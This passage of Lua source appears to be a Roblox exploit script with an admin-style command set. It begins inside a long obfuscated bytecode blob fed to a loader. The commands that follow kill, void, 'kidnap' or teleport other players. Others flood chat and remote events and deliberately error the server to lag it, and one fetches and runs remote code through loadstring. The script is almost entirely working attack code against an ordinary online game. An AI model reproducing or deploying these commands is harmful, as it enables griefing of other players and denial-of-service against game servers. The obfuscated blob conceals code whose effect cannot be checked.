O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O000F3O000F3O00103O00103O00103O00103O00113O00123O00123O00123O00123O00123O00123O00123O00133O00143O00143O00143O00143O00143O00143O00143O00143O00153O00153O00153O00153O00153O00153O00153O00153O00163O00173O00183O00183O00183O00183O00183O00183O00183O00193O001A3O001A3O001A3O001A3O001A3O001A3O001A3O001A3O001B3O001C3O001D3O001E3O001E3O001E3O001E3O001E3O001E3O001E3O001F3O00203O00203O00203O00203O00203O00203O00203O00203O00213O00213O00213O00213O00213O00213O00213O00213O00223O00223O00223O00223O00233O00243O00243O00243O00243O00243O00243O00243O00253O00263O00273O00283O00293O002A3O002A3O002A3O002A3O002A3O002A3O002A3O002B3O002C3O002C3O002C3O002C3O002C3O002C3O002C3O002C3O002D3O002D3O002D3O002D3O002D3O002D3O002D3O002D3O002E3O002E3O002E3O002E3O002F3O00303O00303O00303O00303O00303O00303O00303O00313O00323O00333O00343O00353O00363O00363O00363O00363O00363O00363O00363O00373O00383O00383O00383O00383O00383O00383O00383O00383O00393O00393O00393O00393O00393O00393O00393O00393O003A3O003A3O003A3O003A3O003B3O003C3O003C3O003C3O003C3O003C3O003C3O003C3O003D3O003E3O003F3O003F3O003F3O003F3O00403O00403O00403O00403O00413O00423O00433O00433O00433O00433O00433O00433O00433O00443O00453O00453O00453O00453O00453O00453O00453O00453O00463O00463O00463O00463O00463O00463O00463O00463O00473O00473O00473O00473O00483O00493O00493O00493O00493O00493O00493O00493O004A3O004B3O004C3O004C3O004C3O004C3O004D3O004D3O004D3O004D3O004E3O004F3O00503O00503O00503O00503O00503O00503O00503O00513O00523O00523O00523O00523O00523O00523O00523O00523O00533O00533O00533O00533O00533O00533O00533O00533O00543O00543O00543O00543O00553O00563O00563O00563O00563O00563O00563O00563O00573O00583O00593O00593O00593O00593O005A3O005A3O005A3O005A3O005B3O005C3O005D3O005D3O005D3O005D3O005D3O005D3O005D3O005E3O005F3O005F3O005F3O005F3O005F3O005F3O005F3O005F3O00603O00603O00603O00603O00603O00603O00603O00603O00613O00613O00613O00613O00623O00633O00633O00633O00633O00633O00633O00633O00643O00653O00663O00663O00663O00663O00673O00673O00673O00673O00683O00693O006A3O006A3O006A3O006A3O006A3O006A3O006A3O006B3O006C3O006C3O006C3O006C3O006C3O006C3O006C3O006C3O006D3O006D3O006D3O006D3O006D3O006D3O006D3O006D3O006E3O006E3O006E3O006E3O006F3O00703O00703O00703O00703O00703O00703O00703O00713O00723O00733O00733O00733O00733O00743O00743O00743O00743O00753O00763O00773O00773O00773O00773O00773O00773O00773O00783O00793O00793O00793O00793O00793O00793O00793O00793O007A3O007A3O007A3O007A3O007A3O007A3O007A3O007A3O007B3O007B3O007B3O007B3O007C3O007D3O007D3O007D3O007D3O007D3O007D3O007D3O007E3O007F3O00803O00803O00803O00803O00813O00813O00813O00813O00823O00823O00823O00823O00833O00843O00843O00843O00843O00843O00843O00843O00853O00853O00853O00853O00853O00853O00853O00863O00873O00873O00873O00873O00873O00873O00873O00873O00883O00883O00883O00883O00883O00883O00883O00883O00893O00893O00893O00893O008A3O008B3O008B3O008B3O008B3O008B3O008B3O008B3O008C3O008D3O008E3O008F3O008F3O00913O00913O008F3O00923O00923O00923O00923O00923O00923O00923O00923O00923O00933O00933O00943O00943O00953O00953O00953O00953O00953O00953O00953O00953O00953O00963O00963O00963O00963O00963O00963O00973O00973O00983O00983O00983O00983O00983O00983O00983O00983O00983O00993O00993O00993O00993O00993O00993O00993O00993O009A3O009A3O009B3O009B3O009B3O009B3O009B3O009C3O009C3O009C3O009C3O009C3O009D3O00A03O00A03O009D3O00A13O00A13O00A13O00A23O00A23O00A23O00A23O00A23O00A23O00A23O00A23O00A23O00A23O00A33O00A33O00A33O00A33O00A33O00A33O00A33O00A33O00A43O00A43O00A43O00A43O00A43O00A43O00A63O00A63O00A43O00A73O00A23O00A73O00A93O00A93O00A93O00AA3O00AA3O00AA3O00AA3O00AB3O00AC3O00AC3O00AC3O00AC3O00AC3O00AC3O00AC3O00AC3O00AC3O00AD3O00AD3O00AD3O00AD3O00AD3O00AE3O00AF3O00AF3O00AF3O00AF3O00AF3O00AC3O00B03O00B23O00B23O00B33O00B33O00B33O00B33O00B43O00B43O00B43O00B43O00B43O00B33O00B43O00B63O00B63O00B63O00B73O00B73O00B73O00B73O00B73O00B73O00B73O00B73O00B73O00B73O00B73O00B83O00B83O00B93O00B93O00B93O00B93O00BA3O00BB3O00BB3O00BC3O00BC3O00BC3O00BC3O00BC3O00BC3O00BC3O00CC3O00CD3O00CD3O00CD3O00CD3O00CD3O00CE3O00CF3O00CF3O00F93O00F93O00F93O00F93O00F93O00FB3O00FB3O00FB3O00FB3O00FB3O0006012O000C012O000D012O000D012O000D012O000E012O000E012O000E012O000F012O000F012O0010012O0010012O0010012O0010012O0010012O0010012O0010012O0011012O0011012O0011012O0011012O0011012O0011012O0011012O0011012O0011012O0012012O0012012O0012012O0012012O0012012O0013012O0013012O0013012O0013012O0013012O0014012O0014012O0014012O0014012O0014012O0015012O0015012O0015012O0015012O0015012O0015012O0015012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0016012O0017012O0017012O0018012O0018012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O0019012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001A012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001B012O001C012O0011012O001D012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O001F012O0020012O0020012O0021012O0021012O0022012O0022012O0023012O0023012O002C012O002C012O0023012O002D012O002D012O0030012O0030012O002D012O0031012O0031012O0032012O0032012O0032012O0033012O0033012O0034012O0034012O0035012O0035012O0036012O0036012O0036012O0036012O0037012O0037012O005D012O005D012O005D012O0037012O005E012O005E012O005E012O005E012O005E012O005F012O005F012O005F012O005F012O005F012O0060012O0060012O0061012O0061012O0063012O0063012O0063012O0064012O0066012O0066012O0066012O0067012O0067012O0067012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O0069012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006A012O006B012O006D012O006D012O006D012O006D012O006D012O006D012O006D012O006D012O006D012O006D012O006E012O006E012O006E012O006E012O006E012O006E012O006E012O006E012O006E012O006E012O0070012O0070012O0070012O0070012O0070012O0070012O0070012O0070012O0070012O0070012O0071012O0071012O0071012O0071012O0071012O0071012O0071012O0071012O0071012O0071012O0071012O0071012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0072012O0073012O0073012O0073012O0073012O0075012O0075012O0075012O0075012O0075012O0075012O0075012O0075012O0077012O0077012O0078012O007A012O007A012O007C012O007C012O007C012O007C012O007C012O007D012O007D012O007D012O007F012O007F012O0080012O0082012O0082012O0084012O0084012O0084012O0084012O0084012O0084012O0084012O0084012O0085012O0085012O0085012O0085012O0085012O0085012O0087012O0087012O0087012O0087012O0087012O0088012O0088012O0088012O008A012O008A012O008B012O008D012O008D012O008F012O008F012O008F012O008F012O008F012O008F012O008F012O008F012O0090012O0090012O0090012O0090012O0090012O0090012O0091012O0093012O0093012O0093012O0093012O0093012O0094012O0094012O0094012O0094012O0094012O0095012O0095012O0096012O0097012O00",v8());
end)

cmd.add({"Kidnap"}, {"Kidnap", "Kidnaps a player (Stand near them and press z)"}, function()
    game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
        if key == 'z' then
            local h = game.Players.LocalPlayer.Character.Humanoid:Clone()
            local plr = game.Players.LocalPlayer.Character
            local CF = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            local lp = game.Players.LocalPlayer
            
            h.Parent = game.Players.LocalPlayer.Character
            h.Name = "Hum"
            
            game.Players.LocalPlayer.Character.Humanoid:Destroy()
            
            for _,v in pairs(game.Players.LocalPlayer:GetDescendants()) do
                if v.ClassName == "Tool" then
                    v.Parent = plr
                end
            end
            wait(.5)
            tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(150, Enum.EasingStyle.Linear)  
            tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(0, -1000, 0)})
            tween:Play()
        end
    end)
end)
	

cmd.add({"unanchoredbtools"}, {"unanchoredbtools", "Gives some btools options, only works on unanchored parts!"}, function()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local mouse = LocalPlayer:GetMouse()
    local movetool = Instance.new("Tool", LocalPlayer.Backpack)
    local deletetool = Instance.new("Tool", LocalPlayer.Backpack)
    local undotool = Instance.new("Tool", LocalPlayer.Backpack)
    local identifytool = Instance.new("Tool", LocalPlayer.Backpack)
    local movedetect = false
    local movingpart = nil
    local movetransparency = 0
    if editedparts == nil then
        editedparts = {}
        parentfix = {}
        positionfix = {}
    end
    deletetool.Name = "Delete"
    undotool.Name = "Undo"
    identifytool.Name = "Identify"
    movetool.Name = "Move"
    undotool.CanBeDropped = false
    deletetool.CanBeDropped = false
    identifytool.CanBeDropped = false
    movetool.CanBeDropped = false
    undotool.RequiresHandle = false
    deletetool.RequiresHandle = false
    identifytool.RequiresHandle = false
    movetool.RequiresHandle = false
    local function createnotification(title, text)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = 1;
        })
    end
    deletetool.Activated:Connect(function()
        createnotification("Delete Tool", "You have deleted "..mouse.Target.Name)
        table.insert(editedparts, mouse.Target)
        table.insert(parentfix, mouse.Target.Parent)
        table.insert(positionfix, mouse.Target.CFrame)
        spawn(function()
            local deletedpart = mouse.Target
            repeat
                deletedpart.Anchored = true
                deletedpart.CFrame = CFrame.new(1000000000, 1000000000, 1000000000)
                wait()
            until deletedpart.CFrame ~= CFrame.new(1000000000, 1000000000, 1000000000)
        end)
    end)
    undotool.Activated:Connect(function()
        createnotification("Undo Tool", "You have undone "..editedparts[#editedparts].Name)
        editedparts[#editedparts].Parent = parentfix[#parentfix]
        editedparts[#editedparts].CFrame = positionfix[#positionfix]
        table.remove(positionfix, #positionfix)
        table.remove(editedparts, #editedparts)
        table.remove(parentfix, #parentfix)
    end)
    identifytool.Activated:Connect(function()
        createnotification("Identify Tool", "Instance: "..mouse.Target.ClassName.."\nName: "..mouse.Target.Name)
    end)
    movetool.Activated:Connect(function()
        createnotification("Move Tool", "You are moving: "..mouse.Target.Name)
        movingpart = mouse.Target
        movedetect = true
        movingpart.CanCollide = false
        movetransparency = movingpart.Transparency
        movingpart.Transparency = 0.5
        mouse.TargetFilter = movingpart
        table.insert(editedparts, movingpart)
        table.insert(parentfix, movingpart.Parent)
        table.insert(positionfix, movingpart.CFrame)
        movingpart.Transparency = movingpart.Transparency / 2
        repeat
            mouse.Move:Wait()
            movingpart.CFrame = CFrame.new(mouse.Hit.p)
        until movedetect == false
    end)
    movetool.Deactivated:Connect(function()
        createnotification("Move Tool", "You have stopped moving: "..mouse.Target.Name)
        movingpart.CanCollide = true
        movedetect = false
        mouse.TargetFilter = nil
        movingpart.Transparency = movetransparenc
    end)
end)


cmd.add({"hatsleash", "hl"}, {"hatsleash", "Makes you be able to carry your hats"}, function()
	for _, v in pairs(game.Players.LocalPlayer.Character:getChildren()) do
        if v.ClassName == "Accessory" then
            for i, k in pairs(v:GetDescendants()) do
                if k.ClassName == "Attachment" then
                    s = Instance.new("RopeConstraint")
                    k.Parent.CanCollide = true
                    s.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
                    s.Attachment1 = k
                    s.Attachment0 = game.Players.LocalPlayer.Character.Head.FaceCenterAttachment
                    s.Visible = true
                    s.Length = 10
                    v.Handle.AccessoryWeld:Destroy()
                end
            end
        end
    end
end)

cmd.add({"toolleash", "tl"}, {"toolleash", "Makes you be able to carry your tools"}, function()
	for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
    end
    getgenv().ToolLeash_Enabled = true
    
    for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v.ClassName == "Tool" then
            x = Instance.new("Attachment")
            s = Instance.new("RopeConstraint")
            v.Handle.CanCollide = true
            x.Parent = v.Handle
            s.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
            s.Attachment1 = game.Players.LocalPlayer.Character["Right Arm"].RightGripAttachment
            s.Attachment0 = v.Handle.Attachment
            s.Length = 100
            s.Visible = true
            task.wait()
        end
    end
    
    for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if v.Name == "RightGrip" then
            v:Destroy()
        end
    end
    
    while getgenv().ToolLeash_Enabled == true do
        task.wait()
        for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v.ClassName == "Tool" then
                v.Handle.Velocity = Vector3.new(math.random(-100, 100), 5, math.random(-100, 100))
            end
        end
    end
end)

cmd.add({"untoolleash", "untl"}, {"untoolleash", "Disable tool leash command"}, function()
    getgenv().ToolLeash_Enabled = false
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

cmd.add({"connectevents", "enableevents"}, {"connectevents <instance> <event>", "Enable the given instance's connections to the event"}, function(objDir, event)
	local obj = loadstring("return " .. objDir)()
	local events = getconnections(obj[event])
	for _, connection in pairs(events) do
		connection:Enable()
	end
end)

wrap(function()
	--i am so not putting an emulator as a command here
end)

--[ LOCALPLAYER ]--
local function respawn()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
	--[[character:ClearAllChildren()
	local newChar = Instance.new("Model", workspace)
	local hum = Instance.new("Humanoid", newChar)
	local torso = Instance.new("Part", newChar)
	newChar.Name = "respawn_"
	torso.Name = "Torso"
	torso.Transparency = 1
	player.Character = newChar
	newChar:MoveTo(Vector3.new(999999, 999999, 999999))
	torso.Name = ""
	torso.CanCollide = false--]]
end

local function refresh()
	local cf, p = CFrame.new(), character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head")
	if p then
		cf = p.CFrame
	end
	respawn()
	player.CharacterAdded:Wait(); wait(0.2);
	character:WaitForChild("HumanoidRootPart").CFrame = cf
end

local abort = 0
local function getTools(amt)
	if not amt then amt = 1 end
	local toolAmount, grabbed = 0, {}
	local lastCF = character.PrimaryPart.CFrame
	local ab = abort
	
	for i, v in pairs(localPlayer:FindFirstChildWhichIsA("Backpack"):GetChildren()) do
		if v:IsA("BackpackItem") then
			toolAmount = toolAmount + 1
		end
	end
	if toolAmount >= amt then return localPlayer:FindFirstChildWhichIsA("Backpack"):GetChildren() end
	if not localPlayer:FindFirstChildWhichIsA("Backpack"):FindFirstChildWhichIsA("BackpackItem") then return end
	
	repeat
		repeat wait() until localPlayer:FindFirstChildWhichIsA("Backpack") or ab ~= abort
		backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
		wrap(function()
			repeat wait() until backpack:FindFirstChildWhichIsA("BackpackItem")
			for _, tool in pairs(backpack:GetChildren()) do
				if #grabbed >= amt or ab ~= abort then break end
				if tool:IsA("BackpackItem") then
					tool.Parent = localPlayer
					table.insert(grabbed, tool)
				end
			end
		end)
		
		respawn()
		wait(.1)
	until
		#grabbed >= amt or ab ~= abort
	
	repeat wait() until localPlayer.Character and tostring(localPlayer.Character) ~= "respawn_" and localPlayer.Character == character
	wait(.2)
	
	repeat wait() until localPlayer:FindFirstChildWhichIsA("Backpack") or ab ~= abort
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	for _, tool in pairs(grabbed) do
		if tool:IsA("BackpackItem") then
			tool.Parent = backpack
		end
	end
	wrap(function()
		repeat wait() until character.PrimaryPart
		wait(.2)
		character:SetPrimaryPartCFrame(lastCF)
	end)
	wait(.2)
	return grabbed
end

cmd.add({"notoolscripts", "nts"}, {"notoolscripts", "Destroy all scripts in backpack"}, function()
	local bp = player:FindFirstChildWhichIsA("Backpack")
	for _, item in pairs(bp:GetChildren()) do
		for _, obj in pairs(item:GetDescendants()) do
			if obj:IsA("LocalScript") or obj:IsA("Script") then
				obj.Disabled = true
				obj:Destroy()
			end
		end
	end
end)

cmd.add({"clonetools", "dupetools"}, {"clonetools [amount]", "Clone your tools by the given amount"}, function(amt)
	amt = tonumber(amt) or 1
	getTools(math.clamp(amt, 1, 100))
end)

cmd.add({"abort"}, {"abort", "Abort most indefinite operations"}, function(amt)
	abort = abort + 1
end)

cmd.add({"blockspam"}, {"blockspam [amount]", "Spawn blocks by the given amount"}, function(amt)
	amt = tonumber(amt) or 1
	local hatAmount, grabbed = 0, {}
	local lastCF = character.PrimaryPart.CFrame
	character:ClearAllChildren()
	respawn()
	repeat
		if character.Name ~= "respawn_" then
			local c = character
			repeat wait() until c:FindFirstChildWhichIsA("Accoutrement")
			c:MoveTo(lastCF.p)
			wait(1)
			for i, v in pairs(c:GetChildren()) do
				if v:IsA("Accoutrement") then
					v:WaitForChild("Handle")
					v.Handle.CanCollide = true
					if v:FindFirstChildWhichIsA("DataModelMesh", true) then
						v:FindFirstChildWhichIsA("DataModelMesh", true):Destroy()
					end
					v.Parent = workspace
					table.insert(grabbed, v)
				end
			end
			hatAmount = hatAmount + 1
		end
		character:ClearAllChildren()
		respawn()
		wait()
	until
		hatAmount >= amt
	
	repeat wait() until tostring(localPlayer.Character) ~= "respawn_" and localPlayer.Character
	wait(0.5)
	
	spawn(function()
		repeat wait() until character.PrimaryPart
		wait(0.2)
		character:SetPrimaryPartCFrame(lastCF)
		
		for _, item in pairs(grabbed) do
			if item:IsA("Accoutrement") and item:FindFirstChild("Handle") then
				item.Parent = workspace
				wait()
			end
		end
	end)
end)

cmd.add({"toolblockspam"}, {"toolblockspam [amount]", "Spawn blocks by the given amount"}, function(amt)
	if not amt then amt = 1 end
	amt = tonumber(amt)
	local tools = getTools(amt)
	for i, tool in pairs(tools) do
		wait()
		spawn(function()
			wait(0.5)
			tool.Parent = character
			tool.CanBeDropped = true
			wait(0.4)
			for _, mesh in pairs(tool:GetDescendants()) do
				if mesh:IsA("DataModelMesh") then
					mesh:Destroy()
				end
			end
			for _, weld in pairs(character:GetDescendants()) do
				if weld.Name == "RightGrip" then
					weld:Destroy()
				end
			end
			wait(0.1)
			tool.Parent = workspace
		end)
	end
end)

cmd.add({"clonehats", "dupehats"}, {"clonehats [amount]", "Clone your hats by the given amount"}, function(amt)
	amt = tonumber(amt) or 1
	local hatAmount, grabbed = 0, {}
	local lastCF = character.PrimaryPart.CFrame
	character:ClearAllChildren()
	respawn()
	repeat
		if character.Name ~= "respawn_" then
			repeat wait() until character:FindFirstChildWhichIsA("Accoutrement")
			wait(0.75)
			character:MoveTo(lastCF.p)
			wait(0.25)
			for i, v in pairs(character:GetChildren()) do
				if v:IsA("Accoutrement") then
					v:WaitForChild("Handle")
					v.Parent = workspace
					table.insert(grabbed, v)
				end
			end
			hatAmount = hatAmount + 1
		end
		character:ClearAllChildren()
		respawn()
		wait()
	until
		hatAmount >= amt
	
	repeat wait() until tostring(localPlayer.Character) ~= "respawn_" and localPlayer.Character
	wait(0.5)
	
	spawn(function()
		repeat wait() until character.PrimaryPart
		wait(0.2)
		character:SetPrimaryPartCFrame(lastCF)
		
		for _, hat in pairs(grabbed) do
			if hat:IsA("Accoutrement") and hat:FindFirstChild("Handle") then
				hat.Parent = workspace
				wait()
			end
		end
	end)
end)

cmd.add({"equiptools", "equipall"}, {"equiptools", "Equip all of your tools"}, function()
	game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end
end)

cmd.add({"f3x", "clientf3x"}, {"f3x", "F3X for trolling"}, function()
	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)

cmd.add({"droptools"}, {"droptools", "Drop your equipped tools"}, function()
	game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = workspace
    for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = workspace
        end
    end
end)

cmd.add({"unequiptools"}, {"unequiptools", "Unequip your equipped tools"}, function()
	local h = character:FindFirstChildWhichIsA("Humanoid")
	if h then
		h:UnequipTools()
	end
end)

cmd.add({"notools"}, {"notools", "Remove your tools"}, function()
	for _, tool in pairs(character:GetChildren()) do
		if tool:IsA("Tool") then
			tool:Destroy()
		end
	end
	for _, tool in pairs(localPlayer.Backpack:GetChildren()) do
		if tool:IsA("Tool") then
			tool:Destroy()
		end
	end
end)

cmd.add({"toolkill"}, {"toolkill <player>", "Kill the given players without FE god"}, function(p)
	local players = argument.getPlayers(p)
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	local root = character:FindFirstChild("HumanoidRootPart")
	local point = root.CFrame
	
	if not backpack:FindFirstChildWhichIsA("Tool") then
		lib.messageOut("toolkill", "Cannot bring players, no tools found")
		return
	end
	
	if backpack and hum then
		local tools = getTools(#players+1)
		wait()
		for i, v in pairs(tools) do
			v.Parent = character
		end
		wait()
		for i, v in pairs(tools) do
			v.Parent = workspace
		end
		wait(.2)
		for key, player in pairs(players) do
			local target = player.Character
			if target and player ~= localPlayer then
				root = character:FindFirstChild("HumanoidRootPart")
				local assignedTool = tools[key+1]
				local handle = assignedTool:FindFirstChild("Handle")
				local targetPart = target:FindFirstChild("HumanoidRootPart")
				if handle and targetPart then
					local schar = character
					repeat
						wait()
						root.CFrame = CFrame.new(900, workspace.FallenPartsDestroyHeight+15, 900)
						root.Velocity = Vector3.new(0, 0, 0)
						targetPart.CFrame = CFrame.new(root.Position + root.CFrame.rightVector)
					until
						assignedTool.Parent ~= workspace or localPlayer.Character ~= schar
					
					wait(0.1)
					for i, v in pairs(character:GetDescendants()) do
						if v.Name:find("Grip") and v:isA("Weld") then
							v:Destroy()
						end
					end
					wait()
					root.CFrame = point
				end
			end
		end
	end
end)

cmd.add({"void"}, {"void <player>", "Kill the given players without FE god"}, function(p)
	local players = argument.getPlayers(p)
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	local root = character:FindFirstChild("HumanoidRootPart")
	local point = root.CFrame
	
	if not backpack:FindFirstChildWhichIsA("Tool") then
		lib.messageOut("void", "Cannot bring players, no tools found")
		return
	end
	
	if backpack and hum then
		local tools = getTools(#players+1)
		wait()
		for i, v in pairs(tools) do
			v.Parent = character
		end
		wait()
		for i, v in pairs(tools) do
			v.Parent = workspace
		end
		wait(.2)
		for key, player in pairs(players) do
			local target = player.Character
			if target and player ~= localPlayer then
				root = character:FindFirstChild("HumanoidRootPart")
				local assignedTool = tools[key+1]
				local handle = assignedTool:FindFirstChild("Handle")
				local targetPart = target:FindFirstChild("HumanoidRootPart")
				if handle and targetPart then
					local schar = character
					repeat
						RunService.RenderStepped:Wait()
						root.CFrame = CFrame.new(800, workspace.FallenPartsDestroyHeight + 5, 800)
						targetPart.CFrame = CFrame.new(root.Position + root.CFrame.rightVector)
					until
						assignedTool.Parent ~= workspace or localPlayer.Character ~= schar
					root.CFrame = CFrame.new(800, workspace.FallenPartsDestroyHeight + 5, 800)
				end
			end
		end
	end
end)

cmd.add({"killall", "toolkillall"}, {"killall", "Kill all players using tools"}, function()
	local players = Players:GetPlayers()
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	local root = character:FindFirstChild("HumanoidRootPart")
	local point = root.CFrame
	
	if not backpack:FindFirstChildWhichIsA("Tool") then
		lib.messageOut("killall", "Cannot bring players, no tools found")
		return
	end
	
	if backpack and hum then
		local tools = getTools(#players*3)
		wait()
		for i, v in pairs(tools) do
			v.Grip = v.Grip * CFrame.new(math.random(-16, 16)/8,0,math.random(-16, 16)/8)
			v.Parent = character
		end
		wait()
		for i, v in pairs(tools) do
			v.Parent = workspace
		end
		wait(.2)
		for key, player in pairs(players) do
			local target = player.Character
			if target and player ~= localPlayer then
				root = character:FindFirstChild("HumanoidRootPart")
				local assignedTool = tools[key+1]
				local handle = assignedTool:FindFirstChild("Handle")
				local targetPart = target:FindFirstChild("HumanoidRootPart")
				if handle and targetPart then
					local schar = character
					wrap(function()
						repeat
							RunService.RenderStepped:Wait()
							root.CFrame = CFrame.new(900, workspace.FallenPartsDestroyHeight+30, 900)
							targetPart.CFrame = CFrame.new(root.Position + root.CFrame.rightVector)
						until
							assignedTool.Parent ~= workspace or localPlayer.Character ~= schar
						wait(0.4)
						for i, v in pairs(character:GetDescendants()) do
							if v:isA("Weld") then
								if v.Part0 == handle or v.Part1 == handle then
									v:Destroy()
								end
							end
						end
					end)
				end
			end
		end
	end
end)

cmd.add({"bringall"}, {"bringall", "Bring all players using tools"}, function()
	local players = Players:GetPlayers()
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	local root = character:FindFirstChild("HumanoidRootPart")
	local point = root.CFrame
	
	if not backpack:FindFirstChildWhichIsA("Tool") then
		lib.messageOut("bringall", "Cannot bring players, no tools found")
		return
	end
	
	if backpack and hum then
		local tools = getTools(#players*3)
		wait()
		for i, v in pairs(tools) do
			v.Grip = v.Grip * CFrame.new(math.random(-16, 16)/8,0,math.random(-16, 16)/8)
			v.Parent = character
		end
		wait()
		for i, v in pairs(tools) do
			v.Parent = workspace
		end
		wait(.2)
		for key, player in pairs(players) do
			local target = player.Character
			if target and player ~= localPlayer then
				root = character:FindFirstChild("HumanoidRootPart")
				local assignedTool = tools[key+1]
				local handle = assignedTool:FindFirstChild("Handle")
				local targetPart = target:FindFirstChild("HumanoidRootPart")
				if handle and targetPart then
					local schar = character
					wrap(function()
						repeat
							wait()
							root.CFrame = point
							targetPart.CFrame = CFrame.new(root.Position + root.CFrame.rightVector)
						until
							assignedTool.Parent ~= workspace or localPlayer.Character ~= schar
						root.CFrame = point
					end)
				end
			end
		end
	end
end)

cmd.add({"bring"}, {"bring <player>", "Bring the given player(s)"}, function(p)
	local players = argument.getPlayers(p)
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	local root = character:FindFirstChild("HumanoidRootPart")
	local point = root.CFrame
	
	if not backpack:FindFirstChildWhichIsA("Tool") then
		lib.messageOut("bring <player>", "Cannot bring players, no tools found")
		return
	end
	
	if backpack and hum then
		local tools = getTools(#players+1)
		wait()
		for i, v in pairs(tools) do
			v.Parent = character
		end
		wait()
		for i, v in pairs(tools) do
			v.Parent = workspace
		end
		wait()
		for key, player in pairs(players) do
			local target = player.Character
			if target and player ~= localPlayer then
				root = character:FindFirstChild("HumanoidRootPart")
				local assignedTool = tools[key+1]
				local handle = assignedTool:FindFirstChild("Handle")
				local targetPart = target:FindFirstChild("HumanoidRootPart")
				if handle and targetPart then
					local schar = character
					wrap(function()
						repeat
							wait()
							targetPart.CFrame = handle.CFrame
							root.CFrame = point
						until
							assignedTool.Parent ~= workspace or localPlayer.Character ~= schar
						for i, v in pairs(character:GetDescendants()) do
							if v.Name:find("Grip") and v:isA("Weld") then
								if v.Part0 == handle or v.Part1 == handle then
									v:Destroy()
								end
							end
						end
					end)
				end
			end
		end
	end
end)

cmd.add({"chatspam"}, {"chatspam <number>", "Repeatedly chat a massive string <N> at a time"}, function(n)
	local amt = tonumber(n) or 1
	lib.connect("spam", RunService.RenderStepped:Connect(function()
		for i = 1, amt do
			localPlayer:Chat(("💖"):rep(120000))
		end
	end))
end)

cmd.add({"errorlag", "animlag", "serverlag"}, {"animlag <number>", "Repeatedly error the server with a massive string <N> at a time"}, function(n)
	local amt = tonumber(n) or 1
	local i = 1234
	local symbols = {"💖","❤️","🔥","👍","🎉","😜","💯","💜","😈","💦"}
	local function err(...)
		i = i + 1
		if i > 30000 then i = 1000 end
		local hum = character:FindFirstChildWhichIsA("Humanoid")
		local animation = Instance.new("Animation")
		animation.AnimationId = (symbols[math.random(1, #symbols)]):rep(i)
		hum:LoadAnimation(animation):Play()
		animation:Destroy()
	end
	lib.connect("spam", RunService.RenderStepped:Connect(function()
		for i = 1, amt do
			err()
		end
	end))
end)

cmd.add({"soundspam", "playallsounds"}, {"soundspam", "Repeatedly play all sounds"}, function()
	if SoundService.RespectFilteringEnabled == true then lib.messageOut("soundspam", "Sounds will not replicate") return end
	local sounds = {}
	for i, v in pairs(getinstances and getinstances() or game:GetDescendants()) do
		pcall(function()
			if v:IsA("Sound") and v:IsDescendantOf(workspace) then
				table.insert(sounds, v)
			end
		end)
	end
	local c = lib.connect("spam", RunService.RenderStepped:Connect(function() end))
	while c.Connected do
		for _, sound in pairs(sounds) do
			sound:Play()
			sound.TimePosition = sound.TimeLength/3
		end
		wait(0.15)
	end
end)

cmd.add({"remotespam", "exhaust"}, {"remotespam <number>", "Repeatedly fire all remotes <N> at a time"}, function(n)
	local amt = tonumber(n) or 1
	local events, functions = {}, {}
	local str = ("💖"):rep(120000)
	for i, v in pairs(getinstances and getinstances() or game:GetDescendants()) do
		pcall(function()
			if v.Name:find("%d") == 1 then return end
			if v:IsA("RemoteEvent") then
				table.insert(events, v)
			elseif v:IsA("RemoteFunction") then
				table.insert(functions, v)
			end
		end)
	end
